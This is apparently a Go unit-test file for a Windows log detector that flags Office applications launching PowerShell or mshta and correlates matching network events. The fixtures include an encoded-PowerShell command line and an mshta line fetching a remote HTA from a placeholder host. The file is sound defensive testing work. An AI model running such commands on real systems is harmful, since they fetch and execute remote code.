package analysis

import (
	"testing"
	"time"

	"github.com/pctaha501-create/AI-Log-Reader-Defender/internal/model"
)

func TestProcessDetectsOfficeLaunchingPowerShell(t *testing.T) {
	now := time.Date(2026, 11, 24, 12, 0, 0, 0, time.UTC)
	events := []model.Event{{Timestamp: now, Host: "workstation-1", EventID: "4688", Source: "Security", Raw: map[string]any{
		"NewProcessName": `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "ProcessId": "0x1200",
		"ParentProcessName": `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`, "ParentProcessId": "0x800",
		"CommandLine": "powershell.exe -NoProfile -EncodedCommand AAAA",
	}}}
	if !hasRule(Analyze(events), "process.suspicious-parent-child") { t.Fatal("expected suspicious Office-to-PowerShell process finding") }
}

func TestProcessCorrelatesSamePIDNetworkEvent(t *testing.T) {
	now := time.Date(2026, 11, 24, 12, 0, 0, 0, time.UTC)
	events := []model.Event{
		{Timestamp: now, Host: "host-a", EventID: "1", Provider: "Sysmon", Raw: map[string]any{
			"Image": `C:\Windows\System32\mshta.exe`, "ProcessId": "1234",
			"ParentImage": `C:\Program Files\Microsoft Office\WINWORD.EXE`, "ParentProcessId": "100",
			"CommandLine": "mshta https://example.invalid/a.hta",
		}},
		{Timestamp: now.Add(30*time.Second), Host: "host-a", EventID: "5156", Provider: "Microsoft-Windows-Security-Auditing", Raw: map[string]any{
			"ProcessID": "0x4d2", "DestAddress": "198.51.100.20", "DestPort": "443",
		}},
	}
	for _, f := range Analyze(events).Findings {
		if f.RuleID == "process.suspicious-parent-child" {
			if len(f.EventIndexes) != 2 || f.EventIndexes[1] != 1 { t.Fatalf("expected process and matching network evidence, got %#v", f.EventIndexes) }
			return
		}
	}
	t.Fatal("expected process finding with correlated network evidence")
}

func TestProcessDoesNotFlagNormalParentChild(t *testing.T) {
	events := []model.Event{{EventID: "4688", Raw: map[string]any{
		"NewProcessName": `C:\Windows\System32\notepad.exe`, "ProcessId": "10",
		"ParentProcessName": `C:\Windows\explorer.exe`, "ParentProcessId": "2",
	}}}
	if hasRule(Analyze(events), "process.suspicious-parent-child") { t.Fatal("ordinary Explorer-to-Notepad execution must not trigger") }
}

func TestProcessRequiresExplicitParentAndChildImages(t *testing.T) {
	events := []model.Event{{EventID: "4688", Message: "WINWORD.EXE started powershell.exe"}}
	if hasRule(Analyze(events), "process.suspicious-parent-child") { t.Fatal("free-text mention without structured parent/child fields must not trigger") }
}
